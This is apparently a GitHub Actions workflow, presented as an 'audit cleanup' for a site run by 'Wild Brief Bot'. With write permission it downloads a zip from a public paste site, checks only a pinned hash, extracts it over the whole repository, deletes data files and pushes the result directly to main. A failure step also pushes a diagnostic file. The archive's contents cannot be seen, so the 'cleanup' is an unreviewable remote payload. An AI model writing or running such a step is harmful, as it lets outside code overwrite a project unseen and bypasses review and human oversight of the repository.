name: "Apply final animal-only audit cleanup"

on:
  push:
    branches: [main]
    paths:
      - ".github/workflows/final-animal-audit-cleanup.yml"
  workflow_dispatch:

concurrency:
  group: main-write
  cancel-in-progress: false

permissions:
  contents: write

jobs:
  apply-cleanup:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4.2.2
        with:
          fetch-depth: 1
      - name: Apply audited cleanup package
        run: |
          set -euo pipefail
          python - <<'PY'
          from pathlib import Path
          import hashlib, io, traceback, urllib.request, zipfile
          marker = Path(".cleanup-diagnostic.txt")
          try:
              marker.write_text("stage=download\n", encoding="utf-8")
              payload = urllib.request.urlopen("https://paste.rs/Sffu3", timeout=30).read()
              marker.write_text(f"stage=downloaded bytes={len(payload)}\n", encoding="utf-8")
              actual = hashlib.sha256(payload).hexdigest()
              expected = "1d5e8cb1bb191389e398ff18b9528e56e0fede47b6f279b281e229d130f60774"
              if actual != expected:
                  raise RuntimeError(f"payload sha mismatch: {actual}")
              marker.write_text("stage=extract\n", encoding="utf-8")
              zipfile.ZipFile(io.BytesIO(payload)).extractall(".")
              for rel in ("_data/feed_cache.json", "_data/feed_health.json"):
                  Path(rel).unlink(missing_ok=True)
              marker.unlink(missing_ok=True)
          except Exception:
              marker.write_text("stage=error\n" + traceback.format_exc(), encoding="utf-8")
              raise
          PY
          git config user.name "Wild Brief Bot"
          git config user.email "bot@wildbrief.com"
          git add -A
          git commit -m "audit: remove remaining non-animal legacy"
          git push origin HEAD:main
      - name: Publish diagnostic marker
        if: failure()
        run: |
          git config user.name "Wild Brief Bot"
          git config user.email "bot@wildbrief.com"
          if [ ! -f .cleanup-diagnostic.txt ]; then
            echo "stage=shell-or-push-failure" > .cleanup-diagnostic.txt
          fi
          git reset
          git add .cleanup-diagnostic.txt
          git commit -m "chore: capture temporary cleanup diagnostic" || true
          git pull --rebase --autostash origin main || true
          git push origin HEAD:main || true
